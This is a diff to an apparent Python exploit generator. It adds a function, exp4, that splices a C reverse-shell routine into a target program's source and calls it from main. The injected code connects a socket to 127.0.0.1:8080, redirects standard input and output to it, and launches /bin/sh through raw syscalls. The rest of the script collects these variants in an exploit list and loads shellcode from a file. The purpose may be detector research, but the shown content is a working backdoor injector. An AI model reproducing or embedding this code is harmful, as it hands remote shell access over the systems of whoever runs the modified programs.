@@ -80,9 +80,42 @@ void evil(){
     evil_code+= f2[ret_place:]
     return evil_code
 
+def exp4(s):
+    evil_code = f2[:main_place]
+    evil_code+="""
 
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+ 
+void evil(){
+  int scktd;
+  struct sockaddr_in client;
+ 
+  client.sin_family = AF_INET;
+  client.sin_addr.s_addr = inet_addr("127.0.0.1");
+  client.sin_port = htons(8080);
 
-exploit_list = [exp1,exp2,exp3]
+  scktd = syscall(41,2,1,0);
+  connect(scktd,(struct sockaddr *)&client,sizeof(client));
+  dup2(scktd,0); // STDIN
+  dup2(scktd,1); // STDOUT
+  dup2(scktd,2); // STDERR
+  syscall(59,"/bin/sh",NULL,NULL);
+
+  return;
+}
+"""
+
+    evil_code += f2[main_place:ret_place]
+    evil_code += '''
+    evil();
+'''
+
+    evil_code += f2[ret_place:]
+    return evil_code
+
+exploit_list = [exp1,exp2,exp3,exp4]
 s = open("shellcode1.txt","r").read()
 s = s.split('unsigned char buf[] =')[1:]
 s = [i.split(';')[0] for i in s]
